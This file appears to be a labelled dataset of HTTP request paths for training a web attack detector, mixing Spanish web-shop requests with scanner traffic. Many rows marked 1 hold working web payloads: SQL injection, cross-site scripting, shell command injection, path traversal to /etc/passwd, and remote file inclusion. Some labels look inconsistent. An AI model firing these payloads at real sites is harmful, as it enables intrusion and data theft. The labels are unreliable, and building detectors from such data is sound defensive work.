request	label
/ string / modo = registro & login = bonnar & password = perillana & nombre = benito & apellidos = estruga + barrozzi & email = offerall @ eonon . com . ci & dni = 78627299m & direccion = poetisa + rosalia + de + castro ,  + 41 ,  + 3 ? e & ciudad = valhermoso + de + la + fuente & cp = 24174 & provinciaa = cuenca & ntc = 3588478670456559 & b1 = registrar 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo ewgaea )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  & "	1
/ encryption_auth / 	0
/ cacti / webdist . cgi ? distloc =  ; id 	1
/ spacelinks / 	0
/ 0743407180 / 	0
"/ i686v90l . html ?  < meta http-equiv = set-cookie content =  "" testfutf = 1550 ""  > "	1
/ javascript / pda . asmx 	0
/ javascript / count . csv 	0
"/ string / strings / parameters = -1048 %  ""  ""  or 3038 = 3038 "	1
/ 000099764 / 	0
/ administrator / components / com_clickheat / includes / heatmap / main . php ? mosconfig_absolute_path = xxpathxx 	1
/ gpb / include / gpb . inc . php ? root_path = xxpathxx ? 	1
"/ string / modo = registro & login = izaak & password = calibracin & nombre = hortencia & apellidos = turet + maiorana & email = hannon . white8 @ mtos . st & dni = 88648013x & direccion = c /  + ajuntament + s / n +  & ciudad = santa + mara + del + titar & cp = 50491 & provincia = ourense <  !  --  # include + file =  "" archivo_secreto ""  +  --  >  & ntc = 6434125672280477 & b1 = registrar "	1
/ string / modo = insertar & precio = 1825 & b1 = pasar + por + caja / 	1
/ string / id = 2 /  & nombre = queso + manchego & precio = 39 & cantidad = 98 & b1 = aadir + al + carrito 	1
/ phpmyadmin / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f 	1
/ nokia_3100 / 	0
/ string / id = 1 & nombre = vino + rioja & precio = 39 & cantidad = 76 & b1 = aadir + al + carrito 	0
/ album . php ? albumid = 1 ' 414095588137 	1
/ string / modo = entrar & login = nga & pwd = suspen3edo7 & remember = off & b1 = entrar 	0
"/ string / strings / parameters = | echo $ ifsyrtpvw $  (  ( 55 + 57 )  )  $  ( echo $ ifsyrtpvw ) yrtpvw "" "	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 95 & b1 = aadir + al + carrito 	0
/ activities / 	0
/ 675264 / 	0
/ string / strings / parameters = vispy 	0
"/ main . php ? logout =  "" ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b "	1
/ btncomputingca / 	0
/ string / modo = registro & login = mastroma & password = pa24dan3cea & nombre = ulrico & apellidos = guindo + vive & email = breon @ sexotelefono . mc & dni = 87258503e & direccion = calle + rio + ciguela ,  + 141 ,  +  & ciudad = manzanilla & cp = 12427 & provincia = len & ntc = 1973457393131031 & b1 = registrar 	0
/ string / strings / parameters = 1 '  +  ( select wgmn where 4368 = 4368 and 7859 = 6151 )  +  ' 	1
/ exchange-server / 	0
/ mailarticle . php ? id =  ' union select 0 , 0 , 0 , 0 , 0 , 0 , username , password , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 from cc_admin /  * 	1
/ 172864 / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 20 + 72 + 75 + 6e + 20 + 69 + 6e + 20 + 44 + 4f + 53 + 20 + 6d + 6f + 64 + 65 + 24 + 00 + 00 + 00 + 00 + 00 + 00 + 00 + 00 +  +  >  > esbq "	1
/ string / modoa = registro & login = shiranth5 & password = petal9192 & nombre = nelma & apellidos = rayo + jaln & email = dubucourt-geoffrey @ intercambioenlaces . name & dni = 75767112y & direccion = plaa + d '  + espanya + 36 + 6-e & ciudad = penagos & cp = 10240 & provincia = mlaga & ntc = 1634165251818381 & b1 = registrar 	1
/ scripts / evb / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1331908736 , 1948616015  -- 	1
/ fucking / 	0
/ string / modo = registro & login = xaviera & password = och * avero & nombre = florestano & apellidos = alegre + nomdedeu & email = pianka @ noviasteresapalacios . mc & dni = 42798379w & direccion = calle + estafeta + 105 + 6c & ciudad = entrala & cp = 47800 & provincia = burgos & ntc = 2111805626623658 & b1 = registrar 	0
/ string / strings / parameters = 1 %  '  )  )  and  ( 8853 = 9924 )  * 9924 and  (  (  '  %  '  =  ' 	1
/ col5top / 	0
/ scripts / search . php ? getdate =  .  / templates / default / admin . tpl 	1
/ javascript / signed . jar 	0
/ scripts / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331918989 '  )  <  / script > 	1
/ hotsheetartbasel / 	0
/ main . php ? stuff =  | ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; 	1
/ 713508 / 	0
"/ top . php ? stuff =  ""  ; uname  > q35544877  # "	1
/ 000102019 / 	0
/ yahoo-raises-prices-on-music-service / 	0
/ string / strings / parameters = 50645313a 	0
/ string / strings / parameters = serene 	0
/ components / com_mospray / scripts / admin . php ? basedir =  @ rfiurl ? basedir =  @ rfiurl ?  & cmd = id 	1
"/ ht8pn8uq . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / buildr . lst 	0
/ 961399 / 	0
/ string / strings / parameters = -9509 )  union all select 1193 , 1193 , 1193 # 	1
/ string / strings / parameters = -3861 '  )  as zmja where 4036 = 4036 or 9323 = 9323 # 	1
/ cacti / directory . php ? dir =  ; cat  / etc / passwd 	1
/ string / strings / parameters = -5058 %  '  union all select 6789 , 6789 , 6789 , 6789 , 6789 # 	1
/ lookahead14 / 	0
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testqppc = 8767 ""  > "	1
/ string / strings / parameters = 1 '  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  ' novq '  =  ' novq 	1
/ kathyellen / 	0
/ javascript / index_1 . exe 	1
/ string / modo = insertar & precio = 5003 & b1 = confirmar / 	1
/ script / ident / loginmodif . php ? path_inc = http :  /  / cirt . net / rfiinc . txt ? 	1
/ string / strings / parameters = 1 '  where 1623 = 1623 ; select  ( case when  ( 4393 = 2875 )  then 1 else 4393 *  ( select 4393 from master .  . sysdatabases )  end )  -- 	1
/ string / strings / parameters = $  { passthru ( print (  ` echo pyelub ; echo  $  (  ( 29 + 64 )  )  ; echo pyelub ; echo pyelub `  )  ;  # pyelub 	1
/ loserq / 	0
/ 047596 / 	0
/ string / strings / parameters = yuvia 	0
/ string / strings / parameters = 1 '  and make_set ( 8403 = 8403 , 8899 )  and  ' lnwe '  =  ' lnwe 	1
/ javascript / shoutbox . swf 	0
/ string / strings / parameters = 70679983v 	0
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ boot . ini 	1
/ string / str =  $  ( echo yqabcf )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ string / strings / parameters = yax 	0
"/ main . php ? logout =  ""  | ping -w 11000 -n 1 1 . 2 . 3 . 4 | rem "	1
"/ string / strings / parameters = < var onmouseover =  "" prompt ( 1 )  ""  > on mouse over <  / var >  ? "	1
/ string / strings / parameters = 00699529f 	0
/ string / id = 1 & nombre = queso + manchego & precio = 100 /  & cantidad = 15 & b1 = aadir + al + carrito 	1
/ examples / jsp / jsp2 / jspx / index . php ? search =  < script > foo <  / script > 	1
/ string / strings / parameters = 1 '  in boolean mode )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  # 	1
/ string / strings / parameters = collazo fonts 	0
/ string / modo = entrar & login = hedrich & pwd = chonta & remember =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = entrar 	1
"/ string / strings / parameters = ""  &  & echo eiucdv $  (  ( 83 + 99 )  )  $  ( echo eiucdv ) eiucdv "" "	1
/ niet1876775312 . asp 	0
/ string / strings / parameters = 317 	0
/ string / strings / parameters = 9828908323300958 	0
/ javascript / perl . class 	0
"/  < script > document . cookie =  "" testziyq = 5055 ;  ""  <  / script > "	1
/ string / strings / parameters = d-icotmico 	0
/ string / strings / parameters = 16154 	0
/ artcensorship / 	0
/ pbserver /  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og 	1
/ examples / jsp / cal / topic . php ? tid =  ' select 	1
/ phpmyadmin / index . php ? page =  / etc / passwd \ x00 	1
/ javascript / next . csv 	0
/ j2kdmfw4 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = registro & login = boudin & password = interpretacin & nombre = alcibades & apellidos = ferrandi + moja & email = leistiko @ soymadrileo . je & dni = 21274501f & direccion = travesia + travesia + 1 + isaac + peral ,  + s / n +  & ciudad = ivor *  * ra & cp = 09091 & provincia = segovia & ntc = 2482906400759424 & b1 = registrar 	1
/ string / strings / parameters = 1 %  '  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) gcrr )  # 	1
/ string / modo = insertar & precio = 3525 & b1 = pasar + por + caja 	0
"/ ydexw8by . php3 ?  < script > document . cookie =  "" testulex = 4996 ;  ""  <  / script > "	1
/ string / modo = registro & login = sabanaya4 & password = reco + vero & nombre = indamira & apellidos = domnech + mila & email = thorne-smith @ sandrasummer . fm & dni = 45478096n & direccion = plaa + pau + picasso ,  + 88 ,  +  & ciudad = marchena & cp = 37724 & provincia = burgos & ntc = 8486012682683585 & b1 = registrar 	0
/ string / modo = registro & login = seymour5 & password = 014e35 & nombre = arroldo & apellidos = kagioglu + almendro & email = vildo @ prensahp . fj & dni = 46225556h & direccion = plaa + font ,  + 179 +  & ciudad = caminreal & cp = 19223 & provincia = huesca & ntc = 1901048287713824 & b1 = registrar 	0
/ string / strings / parameters = 1 )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 	1
/ shop / index . php ? action = xxpathxx ?  & cmd = cat config . php 	1
/ elpepucul / 	0
/ mficlean / 	0
/ javascript / 1000 . bak 	0
/ platfsmal / 	0
/ string / strings / parameters = '   str =  $  ( echo roezhe )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
"/ ap58k3ci . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = |   [  1 -ne  $  ( echo pefrrd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ axa-advisors / 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ogqlys )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ string / strings / parameters = 38788994t 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ mp3miesiaca_right / 	0
"/ string / strings / parameters = < script src =  "" data :  \ xe0 \ xa4 \ x98 , javascript : alert ( 1 )  ""  >  <  / script > "	1
/ string / strings / parameters = 6905236399041419 	0
/ editorial01 / 	0
/ string / strings / parameters = 7857158360903973 	0
"/ string / strings / parameters = ""  & echo xpabsl $  (  ( 91 + 48 )  )  $  ( echo xpabsl ) xpabsl "	1
/ string / strings / parameters = )  ;  } print (  ` echo scgphn echo  $  (  ( 41 + 99 )  )  echo scgphn echo scgphn `  )  ;  )  } scgphn 	1
/ scripts / index . php ? search =  < script > foo <  / script > 	1
/ kat-cede_v3 / 	0
/ string / strings / parameters = 1 and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 ) 	1
/ t_virtualpc / 	0
/ cgi-bin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 419495929 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ themes / container . php ? theme_directory = xxpathxx	1
/ wordpress_files / all_users / wp-content / plugins / enigma2 . php ? boarddir = xxpathxx ? 	1
/ string / strings / parameters = kory 	0
/ home_advertisment / 	0
/ boxtopleftcorner08222002 / 	0
/ javascript / css . cc 	0
/ 116963 / 	0
"/ string / strings / parameters = '  |   [  6 -ne  $  ( echo ygaawq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
"/ egaet53a . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ salesstream epos v19 / 	0
/ string / strings / parameters = '   str =  $  ( echo karbcx )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = or 1  --  ' 	1
"/ top . php ? stuff =  "" ping ; -w ; 9000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; "	1
/ string / modo = registro & login = finak & password = enero & nombre = robertino & apellidos = figuerola & email = salter @ quiromante . com . mg & dni = 65223156d & direccion = c /  + de + la + radio + 81 ,  + 7 ? b & ciudad = membrilla & cp = 09260 & provincia = navarra & ntc = 7964371897239814 & b1 = registrar 	0
/ 1165514003 / 	0
/ scripts / admin / plog-admin-functions . php ? config [ basedir ]  =  / etc / passwd \ x00 	1
/ reddivider / 	0
/ string / strings / parameters = pl .  de monteleon 6 	0
/ authenticating / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  and  ( 3502 = 7893 )  * 7893 and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ digitalinclusion / 	0
/ string / strings / parameters = corcoll duhalde 	0
/ 151631 / 	0
/ antispam / listdel ? file = blacklist & name = b < script > alert (  ' vulnerable '  )  <  / script >  & startline = 0 	1
/ qb2xy9aw . php ?  < script > cross_site_scripting . nasl <  / script > 	1
/ stat_trends / 	0
/ torchblue_en / 	0
/ string / modo = registro & login = ploof & password = p04u803 & nombre = alenda & apellidos = pruneda + de + velasco & email = caron @ nexuspark . ai & dni = 85853074bp & direccion = carretera + lebrija ,  + 25 +  & ciudad = santo + tom + del + puerto & cp = 42126 & provincia = cceres & ntc = 7582936564650481 & b1 = registrar 	1
/ help . php ? q = ver \ x09 > q41751651 & rem \ x09 	1
/ autoroute racer / 	0
/ weekendreview / 	0
/ string / strings / parameters = mitsuter 	0
/ input2 . bat ?  | type c :  \ windows \ win . ini 	0
/ javascript / pkg . java 	0
/ 0207_hungryforpeace / 	0
/ string / strings / parameters = schonhals-lackteen @ opel-e-flex . af 	0
/ examples / jsp / jsp2 / el / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_2tgmms8c ]  )  )  ; die ;  /  * 	1
/ javascript / pubs . exe 	1
/ 144489 / 	0
/ pumping iron dvd ntsc / 	0
/ ubuntu-live / 	0
/ sisters of the red death / 	0
/ main . php ? logout =  '  ; uname \ x09 > q35732238 \ x09 # 	1
/ medmicro / 	0
/ admin / admin_news_bot . php ? root_path = xxpathxx ? 	1
/ string / strings / parameters = |  | echo $ ifsiwafla $  (  ( 17 + 83 )  )  $  ( echo $ ifsiwafla ) iwafla /  / 	1
/ examples / jsp / jsp2 / jspx / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini 	1
/ 839838 / 	0
/ string / strings / parameters = 41022572w 	0
"/ string / strings / parameters = '  ;  str =  $  ( echo qukucg )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
"/  < meta http-equiv = set-cookie content =  "" testftxz = 5980 ""  > "	1
/ opencontracts / 	0
/ string / strings / parameters = camaretas 16 	0
/ examples / jsp / error / ncbook / ncbook . cgi ? action = default & current =  | cat  / etc / passwd |  & form_tid = 996604045 & prev = main . html & list_message_index = 10 	1
/ string / strings / parameters = vilasis mena 	0
/ cgi-bin / emumail / emumail . cgi ? type =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = caldes 	0
/ examples / jsp / error / index . php ? act = arcade & do = stats & gameid = 1 ' 	1
/ r7-0021 / 	0
"/ help . php ? q =  ""  & ver ;  > q11575615 & rem ; "	1
/ main . php ? stuff =  & ver ,  > q61913742 & rem , 	1
/ 24967_t2 / 	0
/ 20030224-13 / 	0
/ string / strings / parameters = balaguer 	0
"/ ht8pn8uq . dll ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = entrar & login = lijphart & pwd =  * ramonear & remember = off & b1 = entrar 	0
"/ xlj7h65o . idc ?  < script > document . cookie =  "" testtbbe = 856 ;  ""  <  / script > "	1
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908785 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ trackir3pro-1 / 	0
/ string / strings / parameters = eficiente 	0
/ string / modo = registro & login = kacy & password = en4ocar & nombre = policarpo & apellidosa = stucchi & email = weismuller @ e-b-s . kr & dni = 77550396p & direccion = avinguda + biscaia ,  + 98 + 13-g & ciudad = villares + del + saz & cp = 05514 & provincia = segovia & ntc = 9931554844705461 & b1 = registrar 	1
/ backstreetboysaregay / 	0
/ wirelessmon-v20 / 	0
/ q69438811 	0
/ string / strings / parameters = gimnasia 153 ,  4 ? e 	0
/ string / strings / parameters = |   [  4 -ne  $  ( echo vazljc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hvspqm )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / strings / parameters = filantrpica 	0
/ string / strings / parameters = iris 	0
/ string / strings / parameters = 1 '  )  )  )  waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  ' clcf '  =  ' clcf 	1
/ string / strings / parameters = aana 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo upzcij )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & "	1
/ string / strings / parameters = echo qfcalq $  (  ( 19 + 0 )  )  $  ( echo qfcalq ) qfcalq ' 	1
/ amerithrax / 	0
/ string / strings / parameters = 1 %  '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  -- 	1
/ string / modo = entrar & login = shedd & pwd = sensiblemente & remember = off & b1 = entrar 	0
"/ ny1b3qq4 . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
